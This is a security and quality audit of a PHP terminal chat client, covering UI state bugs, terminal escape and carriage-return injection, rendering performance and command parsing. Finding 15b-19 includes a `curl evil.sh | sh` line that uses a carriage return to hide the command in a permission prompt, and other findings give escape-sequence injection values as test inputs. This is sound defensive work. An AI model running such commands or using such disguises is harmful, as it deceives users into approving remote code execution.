# 15b — Audit: sugar-crush interactive UI state machine and rendering

Scope: `src/Chat.php`, `src/Renderer.php`, `src/App/`, `src/Tui/`, `src/Commands/`, `src/CommandParser.php`, the `*Msg.php` classes, `src/Attachment*.php`.
Status: **Final.** What was and was not audited is listed in [Coverage](#coverage).
Excluded: everything in `99-synthesis.md` Part II. Where a finding adds evidence to a known item, it says so.

Repro scripts are in `/home/sites/crush-research-repos/_audit-scratch/15b/`. They use `harness.php`, a recording `Backend`, a synchronous Cmd runner and helpers to type and press Enter. Run them with `php <script>`. Local vendor was in **linked** mode (symlinked siblings), so the results reflect the current monorepo source.

Confidence labels:
- **Verified-by-repro**: a script reproduced the failure.
- **Verified-by-reading**: the code path was traced, but no script was run.
- **Suspected**: the check is not finished.

---

## A. Turn state machine and queue

### 15b-02 — After a double-Escape cancel, tool placeholders stay "running" forever; later results land on the wrong row
- **Severity:** High · **Confidence:** Verified-by-repro (`r2_stale_placeholder.php`)
- **Where:** The cancel arm at `src/Chat.php:2069-2080` touches nothing but adds `'history' => [...$this->history, Message::system('_Request cancelled._')]`. In `replaceToolRunningPlaceholder()` at `src/Chat.php:3981`, the first `pendingToolCallId === $event->toolCallId` match wins, searching from the top of history.
- **Failure scenario:**
  - Turn 1 starts a `Bash` tool (live `ToolStarted` → a "⠴ running: slow thing" row). The user presses Esc Esc. The row is never healed and spins in the transcript for the rest of the session. It is persisted to the transcript and healed only on resume, by `reviveTranscriptMessage`.
  - Turn 2's tool has the same id. This is the norm with the DSML and MiniMax parsers (known #12, `dsml_call_0` repeats every response). Its `ToolFinished` replaces **turn 1's** row, and turn 2's own placeholder spins forever.
  - Repro frame: `🔧 tool: Read ✓ ok — slow thing` sits above `system: _Request cancelled._`, and turn 2 shows `⠴ running: read readme`.
  - This is new evidence for known #12. With unique ids the mis-attribution goes away, but the endless spinner stays.
- **Fix:**
  - In the cancel arm, map every `pendingToolCallId !== null` row to the same "interrupted" row `reviveCheckpointMessage()` builds.
  - In `replaceToolRunningPlaceholder()`, search **backwards** (newest first).
  - Also scope pending rows to the generation that created them, for example by recording the generation on the placeholder.
- **Test:** Driven as in the repro: ToolStarted(id X) → Esc Esc. Assert no row has `pendingToolCallId`. Then start a new turn with ToolStarted(X) and ToolFinished(X). Assert that the newest row is the result and the turn-1 row is "interrupted".

### 15b-03 — UI-only rows go to the model: command output, mid-turn notices, background and runtime notices
- **Severity:** Medium-High · **Confidence:** Verified-by-repro (`r1_wire.php`)
- This is new evidence for known #22, which names only `/websearch`, and for #2: SGLang hoists System rows into message 0.
- **Where:**
  - `EngineBackend::toTypedMessages()` at `src/Backend/EngineBackend.php:2071-2083` maps **every** history row to a wire message. There is no ui-only filter.
  - Producers:
    - The `*Response()` helpers at `src/Chat.php:9489, 10354, 12011, 12051, 12464, 16005`, and others, each push `Message::user($inputText), Message::assistant($response)`.
    - `/help` pushes an assistant row.
    - `enqueuePrompt()` at `:7533` and `refuseInFlightCommand()`.
    - `pumpBackgroundSessions()` and `pumpRuntimeNotices()` at `:14609`. These carry git stderr and model-authored tool names from `MinimaxXmlFallbackToolCallParser` warnings.
    - `handlePaletteNewSession()` at `:14182` seeds a new session with an assistant message.
    - The backend error path at `:9402`, `Message::assistant('_[error: …]_')`, becomes the assistant's own words.
- **Repro:** This sequence: `/help`, `/permissions`, prompt 1, mid-turn `/budget` (refused), mid-turn prompt 2 (queued). The wire for prompt 2 is:
  ```
  0 assistant "Slash commands (25): …"            ← /help output, as if the model said it
  1 user      "/permissions"
  2 assistant "No permission gate is attached …"
  3 user      "first question"
  4 system    "/budget is a command, and commands do not run while a turn is in flight …"
  5 system    "Queued (1 waiting) — sent as soon as this turn finishes: second question"
  6 assistant "answer one"
  7 user      "second question"
  ```
  Mid-turn notices are also written **between** a user turn and its answer (rows 4-5).
- **Impact:**
  - Wastes tokens.
  - On SGLang, every notice is hoisted into the system prompt, so the cache prefix breaks on every notice.
  - The model is told it said things it did not say, such as error strings and `/help` text.
  - A transcript can start with an assistant row, which strict providers reject.
  - The session titler's `$userTurns !== 1` check (`:9020-9026`) counts command echoes, so a session whose first input was `/permissions` is never titled.
- **Fix:** Add a `uiOnly` / `agentVisible=false` flag on `Message` (synthesis 1.B) and set it on every notice and command-echo producer above. Filter in `toTypedMessages()` and in the titler and suggestion prompts. Keep notices ordered after the settled answer, or render them in a separate notice stream.
- **Test:** Drive `/help` → prompt through a recording backend. Assert that the backend history contains only the user prompt.

### 15b-04 — A synchronous UserPromptSubmit / SessionStart hook chain runs inside `update()`
- **Severity:** Medium · **Confidence:** Verified-by-reading
- **Where:** `src/Chat.php:4587` (`$this->hooks->userPromptSubmit(...)`) is reached from `submit()` → `update()`. `HookRegistry::executeHooks()` → `ScriptHook` does a blocking `proc_open` plus `stream_select` drain. `ScriptHook::DEFAULT_TIMEOUT_SECONDS = 60.0` per hook.
- **Failure scenario:** A slow or hung prompt hook freezes the whole TUI for up to 60 s per hook (times the chain): no repaint, no Ctrl+C, no Esc. `releaseQueuedPrompts()` runs the same path at settle time.
- **Fix:** Run turn hooks in a `Cmd::promise` (child or async process). Dispatch the turn from the resolved message.
- **Test:** A hook that sleeps 2 s. Assert that `update(Enter)` returns in under 100 ms with a pending Cmd.

### 15b-05 — Menu-bar and shell commands erase the user's draft, then mid-turn refuse with "Your draft is still in the box"
- **Severity:** Medium · **Confidence:** Verified-by-repro (`r8_menu_draft.php`)
- **Where:** `App::runRegistryCommand()` at `src/App/App.php:1775-1799`, together with `clearInputKeys()` at `:1817-1826`. It feeds synthetic Backspace and Delete keys, then types `/name` + Enter. Callers:
  - `dispatchMenuSelection()`, which runs every menu-bar item;
  - `NewSessionCmd` (Ctrl+N);
  - `ProviderSelectCmd`.
- **Code:** `...array_fill(0, $before, new KeyMsg(KeyType::Backspace)), ...array_fill(0, $after, new KeyMsg(KeyType::Delete))`
- **Repro:** A turn is in flight and the draft is `my carefully composed follow-up draft`. Selecting menu Model → Switch model leaves the draft as `"/model"`, and the notice reads "…Your draft is still in the box…". The original draft is gone. When idle, the draft is also silently destroyed.
- **Fix:** Route menu and shell commands through a Chat entry point that runs a command without touching `input`, such as `Chat::runCommand(string)`, or stash and restore the draft the way `releaseQueuedPrompts()` does. Refuse mid-turn **before** clearing.
- **Test:** App + in-flight Chat + draft. Send `consumeShellCmd(new MenuSelectedMsg('Model','Switch model'))`. Assert that `chat->inputBuf` is unchanged.

### 15b-06 — Switching session (tab, picker, palette New session) keeps the compaction thrash counter
- **Severity:** Low · **Confidence:** Verified-by-reading
- **Where:** `switchToSession()` at `src/Chat.php:1587-1604` and `handlePaletteNewSession()` at `:14163-14185` do not reset `consecutiveRefillCompactions`. `handleClearCommand()` does reset it, and its docblock gives the reason: leaving the count "would refuse the first ordinary prompt of a brand-new session".
- **Scenario:** Session A trips the thrash breaker. The user switches to a large session B, which needs compaction, and is refused at once by `thrashBreakerRefusal()` because of A's history.
- **Fix:** Reset `consecutiveRefillCompactions` (and `lastActivityAt`) in both functions.
- **Test:** Set the counter to the threshold, `switchToSession`, and assert the counter is 0.

## B. Terminal injection and frame geometry

### 15b-07 — Raw CR (`\r`) reaches the terminal from user/system rows, tool names and descriptions, and expanded tool output
- **Severity:** High · **Confidence:** Verified-by-repro (`r9_toolinj.php`, `r4_app.php`, `r3_width.php`)
- **Where:** `Sanitize::untrusted()` deliberately keeps TAB, LF and CR (`candy-core/src/Util/Sanitize.php:227-237`). The Renderer then emits the text without splitting on CR at these places:
  - `src/Renderer.php:2979` (User) and `:2981` (System);
  - `:3283` (tool name);
  - `toolCallSuffix` (description);
  - `:3292` + `renderToolBody()` `:3559-3561`. The expanded branch returns `$body` verbatim. The collapsed branch does split on `\r` in `collapseToolOutput()`.
- **Repro:**
  - `r9`: CR leaks for tool `name`, `desc`, expanded `result` and expanded `error`.
  - `r4`: in the **hosted App frame**, row `│ │  user> visible\rHIDDEN-OVERWRITE │` and `system: note\rSPOOF` go to the wire. CR moves the cursor to column 0, and the rest of the row overwrites the left pane (Files) and the borders. The diff renderer's 1-line-per-row model is now wrong for that row.
- **Realistic sources, non-malicious:**
  - **Ctrl+O on any Bash result with a progress bar** (`git clone`, `npm install`, `composer`, `curl`);
  - git stderr in `WorktreeManager` runtime notices (→ System rows);
  - hook `additionalContext` (System);
  - resumed transcripts.
- **Malicious:** A tool or file output, or a model-authored `description`, can use CR to paint over the permission-relevant UI to its left.
- **Fix:** Normalize `\r\n`→`\n` and lone `\r`→`\n` (or drop it) in the Renderer's `untrusted()` wrapper, so the one wrapper covers every path. Or add `Sanitize::untrustedForDisplay()` in candy-core that also maps CR.
  - The wrapper alone is not enough. Some sites call `Sanitize::untrusted()` directly and would miss a wrapper-only fix: `wrapPermissionText()` (`src/Renderer.php:4677-4682`, see 15b-19) and `renderToolImage()`'s error line. The candy-core variant covers them all.
- **Test:** For each row kind (user, system, tool name/description, expanded result and error), render content `a\rb` and assert `!str_contains($frame, "\r")`.

### 15b-08 — UTF-8-encoded C1 controls (U+009B CSI, U+009D OSC, U+0090 DCS) pass every sanitizer and reach the frame
- **Severity:** Medium · **Confidence:** Verified-by-repro that the bytes reach the frame (`md_inject.php`, `r9_toolinj.php`). Exploitability is Suspected: it depends on the terminal.
- **Where:** `Ansi::strip()` treats a 0x80-0x9F byte as a control only when no lead byte precedes it. So `\xC2\x9B` (U+009B) survives `Sanitize::untrusted()` and CandyShine's markdown. It leaks on assistant markdown (`src/Renderer.php:3004`), tool name, description, args, diff, result and error.
- **Scenario:** xterm and some other terminals interpret UTF-8-encoded C1 as controls, so `U+009B 2 J` acts as `CSI 2 J` and model or tool output can clear the screen or move the cursor. VTE- and kitty-family terminals are believed to ignore them; this is not verified.
- **Fix:** This is a cross-lib change in candy-core `Sanitize::untrusted()`: also strip the codepoints U+0080-U+009F (`/\xC2[\x80-\x9F]/`). Apply the same sweep to CandyShine's text output.
- **Test:** `Sanitize::untrusted("a\u{9b}2Jb") === 'a2Jb'`. A Renderer test asserting there is no `\xC2\x9B` in the frame for each row kind.

### 15b-09 — The chat status bar is never clipped to the terminal width
- **Severity:** Medium (standalone `Chat` root) / Low (hosted App) · **Confidence:** Verified-by-repro (`r3b.php`, `r4_app.php`)
- **Where:** `Renderer::renderStatusBar()` at `src/Renderer.php:1657-1907`. `$processing` (54 cells idle: `Enter to send · Ctrl+P menu · /exit or ^C to quit`) is always appended. Only the optional segments are width-budgeted. Return is at `:1907` with no `Width::truncate`.
- **Repro:** `Chat::withSize(40,20)` gives a last row of width 54; `withSize(30,10)` also gives 54.
  - In the hosted App, `Tui\Renderer::clipWidth()` cuts it at the frame edge. Inside the chat pane it overruns the pane's inner width: `│ 0% · Enter to send · C │` at 50 columns, where the context figure was already squeezed to `0%`.
  - In-flight text (`⠴ thinking… · Esc Esc to cancel`) behaves the same way.
- **Second geometry defect:** `$contentWidth = max(20, cols - 6)` at `:1294` makes the shell 26 cells wide on terminals under 26 columns. `r3_width.php` gives width 26 > 25 for every row kind at 25 columns.
  - The overlays share this floor. `r17_overlay_width.php`, with the status bar excluded: the palette, `/keys` and Ctrl+R history are 26 cells at 16 and 24 columns, and the slash popup is 18 cells at 16 columns. Their own clipping is otherwise correct: no overlay overran at 32 or 48 columns, and no frame was taller than its rows.
- **Fix:** `Width::truncate($bar, $cols)` (ANSI-aware) at `:1907`. Drop or shorten `$processing` segments in priority order. Clamp `contentWidth` to `max(1, cols-6)`.
- **Test:** For cols in {20, 30, 40}, assert every frame row satisfies `Width::string($row) <= $cols`.

### 15b-10 — Every frame re-renders the whole history through CandyShine; keystroke latency grows linearly with the session
- **Severity:** Medium-High · **Confidence:** Verified-by-repro (`r7_perf.php`, `r7b.php`)
- **Where:** `Renderer::renderView()` → `renderHistory()` at `src/Renderer.php:2947-2985` builds `new Markdown(...)` and renders **every** message on every frame. Only afterwards does it slice to the visible rows (`array_slice($contentLines, $sliceStart, $available)`). There is no per-message cache. `renderStreamingTurn()` also re-parses the whole partial reply on every token batch.
- **Measured** (120×40, one user + one markdown answer + one tool row per exchange):
  - 50 exchanges: **179 ms/frame**
  - 200 exchanges: **706 ms/frame**
  - 800 exchanges: **2.95 s/frame**
  - Breakdown at 100 rows each: user-only 35 ms, tool rows 41 ms, **assistant markdown 331 ms**.
- **Streaming partial** (`r13_stream_cost.php`, lead 6 confirmed): `renderStreamingTurn()` re-parses the whole unbounded `streamingText` on every pump. A 20 KB partial takes **213 ms/frame**, 100 KB **1.04 s/frame** and 200 KB **2.14 s/frame**, even with no history. One long answer (a large file written as prose, or a long plan) is enough to stall the loop for the rest of that answer.
- Each keystroke, token batch and tick re-renders, so in a long agentic session typing lags by close to a second and the event loop stalls, delaying tool-event pumping and watchdogs.
- **Fix:**
  - Memoize rendered blocks per `(message identity/hash, width, theme, expanded-state)`. A static LRU keyed on `spl_object_id` + content hash works.
  - Render only from the bottom up until the visible rows plus the scroll offset are filled.
  - Cache the streaming partial's settled-paragraph prefix.
- **Test:** A performance guard: 300 markdown exchanges must render in under 50 ms after the first frame, or the markdown renderer must be called at most N times on an unchanged second frame (count it with a spy theme or renderer).

## C. Commands and parsing

### 15b-11 — Any prompt that starts with "mcp auth" is captured by the MCP command, including prose such as "mcp authentication fails…"
- **Severity:** Low-Medium · **Confidence:** Verified-by-repro (`r5_cmdparse.php`)
- **Where:** `src/Chat.php:8247` `if (str_starts_with($text, 'mcp auth'))` and the mid-turn variant at `:7178`. There is no word boundary.
- **Repro:** `mcp authentication keeps failing on my server, why?` → backend calls 0. The transcript shows `✗ Unknown sub-command 'authentication'`, and the question never reaches the model. Mid-turn, the same prose is refused as a command and not queued.
- **Note:** The bare `mcp auth` spelling is documented (`docs/COMMANDS.md:329`), but the prefix collision is not.
- **Fix:** `preg_match('/^mcp\s+auth(\s|$)/', $text)` in both places.
- **Test:** The prompt `mcp authentication…` dispatches to the backend. `mcp auth list` still routes to the handler.

### 15b-12 — Session titling falls back to the main, tool-armed backend when there is no toolless title backend
- **Severity:** Medium · **Confidence:** Verified-by-reading
- **Where:** `src/Chat.php:9029` `$backend = $next->titleBackend ?? $next->backend;`. `Bootstrap::titleBackend()` → `toollessBackend()` returns null:
  - when `selectedProviderName()` is null, which is always the case on the `SUGARCRUSH_BACKEND_CMD[_STREAM]` tier (`Bootstrap.php:7626`);
  - when the provider default has no model;
  - when construction throws.
- **Scenario:**
  - With `SUGARCRUSH_BACKEND_CMD` pointing at an agentic CLI, the first prompt is sent **twice**: once as the turn and once as the "title" job, with `[system: TITLE_PROMPT] + history`. An agentic backend can act on the request twice (side effects, double billing).
  - With an `EngineBackend` fallback, the title job runs a full tool-enabled turn in a fork under the default bypass mode.
- **Fix:** When `titleBackend` is null, skip titling (prompt suggestions already work this way), or use a backend that is guaranteed toolless.
- **Test:** A Chat with `backend: RecBackend`, `titleBackend: null` and a session store. Submit the first prompt. Assert the backend is called exactly once.

## D. Estimation, i18n, dormant wiring (lower priority)

### 15b-13 — The token proxy counts codepoints/4, so CJK and emoji text is underestimated 3-6×
- **Severity:** Low-Medium · **Confidence:** Verified-by-reading
- **Where:** `src/Chat.php:14738` `ceil(mb_strlen($msg->content) / 4)`. Calibration is clamped to [1.0, 3.0].
- **Effect:** CJK text runs at roughly 1-1.5 tokens per character. Even fully calibrated, the 70/85/95% tiers fire far too late for CJK users, which leads to provider overflow errors. This is separate from known #21, which concerns the system prompt and tool schemas.
- **Fix:** Count bytes/3, or weight by script (wide characters ≈1 token). A tokenizer-backed estimate would be better.
- **Test:** 10k CJK characters must estimate to at least 8k.

### 15b-14 — sugar-crush has no i18n: every user-facing string is hard-coded
- **Severity:** Low (convention gap) · **Confidence:** Verified-by-reading
- **Where:** `grep -rl 'Lang::t' src/` finds no PHP file. There is no `lang/` directory. `Renderer.php:987-992` acknowledges this.
- **Conflict:** CLAUDE.md requires `Lang::t()`. This is recorded for completeness; it is a large job and not a defect in any one string.

### 15b-15 — Message attachments are dead weight
- **Severity:** Low · **Confidence:** Verified-by-reading
- **Where:** `Message::attachFile()` / `attachImage()` at `src/Message.php:241,261` have no callers. `EngineBackend::toTypedMessages()` drops `attachments`, and `Chat.php:15822` only copies them.
- **Fix:** Per the "wire, don't delete" rule, add `@file` / paste-image attachment in the input box and map it to `UserMessage::withAttachment()` in `toTypedMessages()`.

## E. Repository-supplied and model-supplied text in overlays and panes

### 15b-17 — Model or tool text containing U+E002+n paints a copy of on-screen image n at a position the text chooses, and blanks Nerd Font glyphs (lead 3)
- **Severity:** Low-Medium · **Confidence:** Verified-by-repro (`r10_forged_marker.php`)
- **Where:**
  - `candy-core/src/ImageOverlay.php:143`: `resolve()` turns **every** codepoint in U+E002…U+F8FF into a space, and into a paint when an image with that id exists.
  - `Program::renderFrame()` (`candy-core/src/Program.php:1123`) runs `resolve()` over the **whole** frame whenever `View::$images` is non-empty.
  - `Renderer::untrusted()` (`src/Renderer.php:1218`) strips only the two zone sentinels, U+E000 and U+E001. `maskImageMarkers()` (`:1187`) masks the copy passed to the zone scanner (`:1145`), not the frame the terminal receives.
  - `ImageLayer` assigns ids from 0 for each frame, so U+E002 is "the first picture in this frame".
- **Failure scenario:**
  - A tool result carries an image and a pixel protocol is active (sixel, kitty or iTerm2; `Mosaic::isInline()` is false). From then on, any assistant, user or tool-output row containing U+E002 produces a **second** paint of that image wherever the codepoint lands.
  - Repro: one real image and one forged marker give `images=1 paints=2`, at rows `7:4` and `19:23`. This holds for assistant, user and tool-result rows alike.
  - The forged copy is a 40-column, 10-row block drawn over text after the diff. It can hide the input box, the status bar or tool rows. Near the bottom row a sixel can also scroll the terminal, which desyncs the absolute-cursor diff renderer (suspected; this depends on the terminal's sixel-scrolling mode).
  - **Non-malicious side:** in the same frames, every BMP Private-Use glyph is blanked to a space. That covers Powerline U+E0A0–E0D4, Nerd Font devicons and Pomicons U+E000–E00A (the last of which overlap ids 0–8), as found in `eza --icons`, starship or `git log` output in tool results.
- **Fix:**
  - Give the marker a syntax that untrusted text can no longer carry. For example, frame it with the zone sentinels (`U+E000 'img:' id U+E001`), which `untrustedForMarkedFrames()` already strips from every untrusted string, and have `resolve()` accept only that triple.
  - Alternatively, `ImageLayer` can return the exact (row, col) positions it emitted and `resolve()` can ignore all other markers.
  - Either way, a bare PUA codepoint stops being markup, and Nerd Font glyphs survive.
- **Test:** Render a Chat with one sixel image and an assistant row containing `"\u{E002}"`. Assert `ImageOverlay::resolve()` returns exactly one paint and that the row keeps a Powerline glyph `"\u{E0B0}"`.

### 15b-18 — The session tab strip is neither width-clipped nor sanitized, unlike the session picker
- **Severity:** Low-Medium (standalone `Chat` root: Medium; hosted App: Low) · **Confidence:** Verified-by-repro (`r19_tabstrip.php`, `r19b_tabstrip_noevil.php`)
- **Where:** `Renderer::renderSessionTabStrip()` at `src/Renderer.php:2388-2412`. It reads `listSessions()` (up to 20 rows) and joins `" {$name} "` labels with `|`. There is no `Width::truncate`, no `untrusted()` and no line-break flattening. The picker passes the same rows through `Chat::sanitizeSessionRows()` (`src/Chat.php:11833`). The strip is placed above the shell at `:1367` and is outside every clip.
- **Repro:**
  - Eight ordinary sessions named "Refactor the authentication middleware part N" give a top row **383 cells wide at 80 columns** in the standalone root. That is the over-wide row the diff renderer cannot handle: the terminal wraps it and every later row is painted one line low.
  - In the hosted App, `Tui\Renderer` clips plain names to the pane. A name holding `\e]52;…\a \e[2J` defeats that clip (a 433-cell row at 100 columns), and both escapes reach the hosted frame as well.
- **Where names come from:** the titler sanitizes (`sanitizeSessionTitle()`). `/rename` stores the typed text as is (`src/Chat.php:12291`). Any other writer to the shared `~/.sugar-crush/session.db` also sets names: another sugar-crush version, the incubating Python port, or a hand-edited DB. So the escape half is defence in depth, but the width half triggers on ordinary data.
- **Fix:**
  - Build labels from `sanitizeSessionField()` or `PaneLabel::safe()`.
  - Lay the strip out against `$chat->cols()`: clip each label to a per-tab budget, keep the current tab visible, and collapse the rest into `… +N`.
- **Test:** A store with 8 long names and `cols=80`. Assert `Width::string(first row) <= 80`. Add a name with `\e]52;c;eA==\a` and assert no `\e]` appears in the frame.

### 15b-19 — Latent: the permission modal wraps by bytes (invalid UTF-8) and keeps CR, so a command can display as something else
- **Severity:** Medium (latent; not reachable today) · **Confidence:** Verified-by-repro on the helper (`r16_wordwrap_utf8.php`); reachability verified by reading
- **Where:** `Renderer::wrapPermissionText()` at `src/Renderer.php:4677-4690` calls `Sanitize::untrusted()`, which keeps `\r`, then `wordwrap($line, $cols, "\n", true)`. `wordwrap` counts **bytes** and, with `cut=true`, splits inside multi-byte sequences.
- **Reachability:** the modal is drawn only for a `PermissionRequestMsg`. Those come from Chat's local tool path (`beginToolCalls()`, which requires `$this->tools !== []`), and `Bootstrap::chat()` passes no `tools:`. Today the modal is dead in production, which is consistent with known #1. **The fix for known #1 will bring this modal back into use**, so these defects ship with that fix unless they are addressed first.
- **Repro:**
  - `echo 文件…` (80 CJK characters) at 40 columns gives `valid_utf8=NO`. Its first row is 4 bytes (`echo` plus a split codepoint), and the following rows are 24-26 cells, not 40.
  - A path containing `ü` fails the same way.
  - `curl evil.sh | sh #\recho 'hello world'` comes back with the `\r` intact. On the wire, CR returns the cursor to the modal's left edge, so `echo 'hello world'` is painted over the dangerous half. The user approves a command they did not see.
- **Fix:**
  - Map CR to `\n` (or `␍`) before wrapping, since a permission prompt must never hide text.
  - Wrap with candy-core's ANSI- and cluster-aware `Width::wrapAnsi()`, or a `mb_`/grapheme loop, instead of `wordwrap()`.
  - Make the gating rule for this modal "show every byte as visible text": render C0/C1 as caret notation, not stripped.
- **Test:** `wrapPermissionText(str_repeat('文件', 40), 40)` is valid UTF-8 with every row `<= 40` cells. `wrapPermissionText("a\rb", 40)` contains no `\r`.

## F. Custom commands, session commands and persistence

### 15b-20 — A custom command's `` !`…` `` runs synchronously inside `update()` for up to 10 s, and on timeout its grandchildren survive
- **Severity:** Medium · **Confidence:** Verified-by-repro (`r14_cmd_shell.php`)
- **Where:**
  - `Chat::submit()` → `expandCustomCommand()` (`src/Chat.php:7202`) → `commandDirective()` → `CommandSpec::runShellSubstitution()` (`src/Chat.php:8116`).
  - `runShellSubstitution()` (`src/Commands/CommandSpec.php:563-760`) runs a blocking `stream_select` loop against the shared 10-second `SHELL_BUDGET_SECONDS`.
  - On timeout it calls `proc_terminate($process)` at `:679`. That signals only the direct child. `ProcessContainment::spawnSpec()` made that child a session leader through `setsid`, but no `kill(-pgid)` is sent, even though `ProcessContainment::groupId()` exists for exactly this.
- **Repro:**
  - A template `` !`bash -c 'exec -a <tag> sleep 38'; echo done` `` blocks `expandTemplate()` for **10.1 s**. During that time the TUI is frozen with no repaint, Esc or Ctrl+C, the same class of defect as 15b-04.
  - After the "killed after 10 seconds" notice, the `<tag> sleep 38` grandchild is **still running**.
  - Any `` !`…` `` that starts a background job holding stdout (`npm run dev &`, `docker compose up &`) costs the whole budget and leaks the job.
- **Fix:**
  - Expand file-based commands off the update path, in a `Cmd::promise` or child process that resolves to a "submit expanded text" message.
  - Kill the process group on timeout: `posix_kill(-ProcessContainment::groupId($process), SIGTERM)`, then `SIGKILL`, through `ProcessReaper::escalate()` as `SystemClipboard` does.
  - Register the site with `tools/check-child-lifetimes.php`, if it is not already accounted for there.
- **Test:** The template above with a 1 s budget override. Assert `update(Enter)` returns in under 100 ms with a pending Cmd. After the budget expires, assert `pgrep -f <tag>` finds nothing.

### 15b-21 — `/branch` (and any first save of a long history under a new session id) freezes the TUI for seconds: one autocommitted INSERT per message (lead 4)
- **Severity:** Medium · **Confidence:** Verified-by-repro (`r12_persist_cost.php`)
- **Where:**
  - `Chat::update()` → `persistTranscript()` (`src/Chat.php:1512`) → `EnhancedSessionStore::saveTranscript()` → `encodeCheckpoint()` → `internMessages()`.
  - `internMessages()` executes `INSERT OR IGNORE INTO checkpoint_blobs` once per missing message (`src/Session/EnhancedSessionStore.php:709-719`) with **no surrounding transaction**. Each insert is its own WAL commit, with an fsync at the default `synchronous=FULL`.
  - Blobs are keyed by `session_id`. `/branch` (`handleBranchCommand()`, `:12054`) moves `currentSessionId` to the fork, so the next save re-interns **every** message under the new id. `SessionStore::forkSession()` copies the `messages` rows but not `checkpoint_blobs`.
- **Measured** (800 messages, 2.4 MB, local SSD):
  - first save: **5.5 s**
  - save under the new branch id: **4.3 s** (823 messages)
  - steady-state save of one new row: 16 ms median, 35 ms max
  - cold-cache save after a restart: 51 ms
  - The branch figure is paid synchronously inside the `update()` that handles `/branch`.
- The steady-state 16-35 ms is also paid on **every** history change in `update()`, including each `ToolStarted`, `ToolFinished` and runtime notice. It is tolerable on an SSD and noticeable on network or slow disks.
- **Fix:**
  - Wrap `internMessages()` and the transcript write in one `beginTransaction()` / `commit()`. That is one fsync per save, not one per message.
  - In `forkSession()`, copy the source session's blobs with `INSERT … SELECT`.
  - Longer term, move persistence off `update()` (a debounced `Cmd`).
- **Test:** Spy on the PDO (or count `PRAGMA data_version` bumps) across `saveTranscript()` of 50 new messages and assert one commit. A `/branch` performance guard: 800 messages under 300 ms.

### 15b-22 — `/rewind <anything non-numeric>` silently rewinds one checkpoint; colon spellings reach handlers as a literal `:`
- **Severity:** Low · **Confidence:** Verified-by-repro (`r20_rewind_args.php`)
- **Where:**
  - `handleRewindCommand()` at `src/Chat.php:12336`: `$stepsBack = (int) trim($afterRewind)`, and any value below 1 becomes 1.
  - `dispatchCommand()` accepts `/name:args` (because `CommandParser` splits at `:`), but the handlers slice raw text by fixed offsets: `substr($inputText, 7)` and similar, `:12281` (`/rename`), `:16022` (`/theme`).
- **Repro:**
  - `/rewind last`, `/rewind help` and `/rewind -2` each **perform** a one-step rewind ("Rewound 1 messages to checkpoint 1"). They drop the latest answer from the live and persisted history, when they should print usage.
  - `/rewind:all` does the same.
  - `/rename:Release prep` stores the session name `":Release prep"`.
- **Fix:**
  - Validate with `ctype_digit()` and answer usage otherwise.
  - Have handlers take `$parsed->args` (or the text after the parsed name and an optional `:`) instead of fixed `substr` offsets.
- **Test:** `/rewind help` leaves `history` unchanged except for the usage echo. `/rename:foo` stores `foo`.

### 15b-23 — Custom-command positional arguments: an apostrophe swallows the rest of the line, and empty quoted arguments shift `$N`
- **Severity:** Low · **Confidence:** Verified-by-repro (inline `php -r` over `CommandParser`)
- **Where:** `CommandParser::splitArgs()` at `src/CommandParser.php:99-141`. `'` always opens a quote, an unterminated quote silently runs to the end of the line, and `""` produces no token. `Chat::expandCustomCommand()` uses these tokens for `$1…$9`.
- **Repro:**
  - `/c fix don't touch main.php` gives `["fix","dont touch main.php"]`.
  - `/c it's src/a.php src/b.php` gives `["its src/a.php src/b.php"]`.
  - `/c "" second` gives `["second"]`.
  - `$ARGUMENTS` is unaffected because it uses the raw text. This hits only the documented `$1` form (README example `Review $1 … Focus on: $ARGUMENTS`).
- **Fix:** Treat `'` as a quote only at a token start, keep an unterminated quote literally, and emit empty quoted tokens.
- **Test:** The three inputs above give `["fix","don't","touch","main.php"]`, `["it's","src/a.php","src/b.php"]` and `["","second"]`.

---

## Summary table (sorted by severity)

| ID | Sev | Conf | Title |
|---|---|---|---|
| 15b-02 | High | Repro | Cancelled turn's "running" placeholders never healed; later same-id results land on the old row |
| 15b-07 | High | Repro | Raw CR reaches the terminal (user/system rows, tool name/description, expanded tool output): pane overwrite and diff desync |
| 15b-03 | Med-High | Repro | Command output, mid-turn notices and background/runtime notices go to the model as real turns |
| 15b-10 | Med-High | Repro | Full-history markdown re-render every frame: 0.7 s/keystroke at 200 exchanges; 2.1 s/frame for a 200 KB streaming partial |
| 15b-04 | Medium | Reading | UserPromptSubmit/SessionStart hooks run synchronously inside update() (up to 60 s freeze) |
| 15b-05 | Medium | Repro | Menu and shell commands erase the draft, then claim "draft still in the box" |
| 15b-08 | Medium | Repro (bytes) / Suspected (impact) | UTF-8 C1 controls (U+009B…) pass every sanitizer |
| 15b-09 | Medium/Low | Repro | Status bar not clipped to cols; content width (and every overlay) floored at 20+chrome |
| 15b-12 | Medium | Reading | Title job falls back to the main tool-armed or command backend (first prompt sent twice) |
| 15b-19 | Medium (latent) | Repro (helper) | Permission modal wraps by bytes (invalid UTF-8) and keeps CR; goes live with the fix for known #1 |
| 15b-20 | Medium | Repro | Custom-command `` !`…` `` blocks update() up to 10 s; timed-out grandchildren survive |
| 15b-21 | Medium | Repro | `/branch` re-interns every message with one autocommitted INSERT each: 4.3 s freeze at 800 messages |
| 15b-11 | Low-Med | Repro | Any prompt starting "mcp auth…" is swallowed by the MCP handler |
| 15b-13 | Low-Med | Reading | Token proxy chars/4 underestimates CJK 3-6× |
| 15b-17 | Low-Med | Repro | U+E002+n in model or tool text paints a copy of on-screen image n where the text chooses; Nerd Font glyphs blanked |
| 15b-18 | Low-Med | Repro | Session tab strip unclipped (383 cells at 80 cols, standalone root) and unsanitized |
| 15b-06 | Low | Reading | Session switch keeps the compaction thrash counter |
| 15b-14 | Low | Reading | No i18n in sugar-crush |
| 15b-15 | Low | Reading | Attachments dormant and dropped on the wire |
| 15b-22 | Low | Repro | `/rewind help` (any non-numeric argument) performs a rewind; `/name:arg` reaches handlers as a literal `:` |
| 15b-23 | Low | Repro | Positional `$N` splitting: an apostrophe swallows the rest of the line; `""` shifts the arguments |

**Checked and dropped:**
- **Documented and intentional:** `/HELP`, `/clear all`, `/exit now` and unknown `/foo` fall through to the model (`docs/COMMANDS.md` "Two guards…"). The held queue after Esc Esc goes out after the next prompt (`InFlightInputQueueTest::testAQueueHeldThroughACancelGoesOutOnTheNextSettle`).
- **Lead 1, a parked compaction whose summarization rejects:**
  - `buildSummarizationRequest()` maps the rejection to `HistoryCompactedMsg($id, [], $e->getMessage(), null, $parkedSubmission)` (`src/Chat.php:10848`). `applyModelCompaction()` then compacts on the heuristic and dispatches the parked turn.
